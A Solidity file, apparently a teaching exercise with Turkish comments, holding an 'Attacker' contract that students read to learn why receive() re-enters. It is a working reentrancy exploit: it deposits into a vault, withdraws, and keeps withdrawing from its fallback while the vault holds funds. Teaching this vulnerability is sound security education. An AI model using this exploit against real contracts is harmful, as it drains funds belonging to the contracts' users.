// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IVault} from "../src/Vault.sol";

/// Stage 3 — saldırgan kontrat. Öğrenci bunu yazmaz, OKUR: "receive() neden geri giriyor?"
/// sorusunu kendi kendine cevaplayabilmesi gerekiyor.
contract Attacker {
    IVault public immutable vault;
    uint256 private _stake;

    constructor(IVault v) {
        vault = v;
    }

    function attack() external payable {
        _stake = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // Vault bize para gönderdiği anda çalışır; vault'ta hâlâ para varsa tekrar çek.
    receive() external payable {
        if (address(vault).balance >= _stake) {
            vault.withdraw();
        }
    }
}
